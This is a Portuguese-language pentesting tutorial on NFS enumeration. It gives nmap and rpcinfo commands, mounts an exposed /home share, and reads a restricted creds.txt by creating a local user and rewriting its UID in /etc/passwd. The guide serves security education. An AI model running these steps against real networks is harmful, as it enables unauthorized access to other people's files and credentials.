## Enumeração NFS (Network File System)

### Introdução ao NFS

O **Network File System (NFS)** é um protocolo de sistema de arquivos distribuído desenvolvido originalmente pela Sun Microsystems em 1984. Ele permite que um usuário em um computador cliente acesse arquivos em outro computador pela rede, como se estivessem em um armazenamento montado localmente. O NFS é amplamente utilizado em sistemas operacionais UNIX, mas muitas vezes é mal configurado, o que pode deixar compartilhamentos de arquivos abertos ao mundo, facilitando a exploração por pentesters.

Neste guia, vamos explorar como escanear e enumerar sistemas que utilizam NFS para encontrar potenciais vulnerabilidades.

### Escaneando por Compartilhamentos NFS

O **Portmapper** e o **RPCbind** são processos que mapeiam serviços RPC (Remote Procedure Call) para as portas nas quais eles estão escutando. Ambos serviços geralmente utilizam a porta **111** TCP/UDP. Para descobrir sistemas rodando esses serviços, podemos usar o **nmap** para escanear a rede:

```bash
nmap -v -p 111 192.168.0.1-254
```

Esse comando escaneia o intervalo de IPs de `192.168.0.1` até `192.168.0.254` na porta 111, onde serviços como o **rpcbind** geralmente operam.

### Enumerando Serviços com NSE Scripts

Uma vez identificado que o **rpcbind** está rodando em uma máquina, podemos usar scripts do Nmap para descobrir serviços registrados. Um exemplo de uso do **rpcinfo** para encontrar serviços disponíveis é:

```bash
nmap -sV -p 111 --script=rpcinfo 192.168.0.72
```

Esse comando retorna uma lista de serviços RPC registrados no sistema, incluindo NFS, **mountd** e outros serviços que podem ser explorados. 

Esta enumeração também pode ser feita manualmente com o comando `rpcinfo`:

```bash
rpcinfo 192.168.0.72
```

### Executando Scripts NSE para NFS

O Nmap possui scripts específicos para a enumeração de NFS. Esses scripts podem ser encontrados em `/usr/share/nmap/scripts/` e incluem:
- **nfs-ls.nse**: Lista arquivos e diretórios em compartilhamentos NFS.
- **nfs-showmount.nse**: Mostra as montagens NFS disponíveis.
- **nfs-statfs.nse**: Mostra informações sobre o sistema de arquivos NFS.

Você pode executar todos esses scripts de uma vez para coletar informações sobre os compartilhamentos NFS com o seguinte comando:

```bash
nmap -p 111 --script nfs* 192.168.0.72
```

Esse comando irá listar os diretórios compartilhados, como o exemplo abaixo:

```bash
PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount:
|_ /home 192.168.0.0/255.255.0.0
```

Neste caso, o diretório `/home` está sendo compartilhado com toda a sub-rede `192.168.0.0/16`.

### Montando Compartilhamentos NFS no Kali

Depois de descobrir um compartilhamento NFS, você pode montá-lo em sua máquina Kali para acessar os arquivos. Para isso, use o comando **mount** da seguinte forma:

```bash
mkdir home
sudo mount -o nolock 192.168.0.72:/home ~/home/
cd home/ && ls
```

O parâmetro `-o nolock` desabilita o bloqueio de arquivos, o que pode ser necessário para servidores NFS mais antigos. Após montar o diretório, você pode navegar pelos arquivos e verificar quais informações estão disponíveis.

### Explorando Permissões de Arquivos

Ao acessar diretórios compartilhados via NFS, você pode se deparar com arquivos que possuem permissões restritas. Veja o exemplo abaixo de um arquivo chamado `creds.txt`:

```bash
drwxr-xr-x 2 1014 1014 4096 Jun 10 09:16 .
-rwx------ 1 1014 1014 48 Jun 10 09:16 creds.txt
```

O arquivo `creds.txt` é de propriedade de um usuário com UID 1014, e apenas esse usuário pode lê-lo ou modificá-lo. No entanto, podemos contornar essa restrição criando um usuário local no Kali com o mesmo UID, o que nos permitirá acessar o arquivo.

### Criando um Usuário com UID Personalizado

Para criar um usuário com o UID necessário, siga os passos abaixo:

1. Adicione um novo usuário:
   ```bash
   sudo adduser pwn
   ```

2. Modifique o UID do novo usuário para 1014:
   ```bash
   sudo sed -i -e 's/1001/1014/g' /etc/passwd
   ```

3. Verifique a alteração:
   ```bash
   cat /etc/passwd | grep pwn
   ```

Agora que o usuário tem o mesmo UID que o proprietário do arquivo, podemos mudar para esse usuário e tentar acessar o arquivo novamente:

```bash
su pwn
id  # Verifique o UID
cat creds.txt  # Tente ler o arquivo
```

Se tudo correu bem, você poderá acessar o arquivo e explorar o conteúdo.
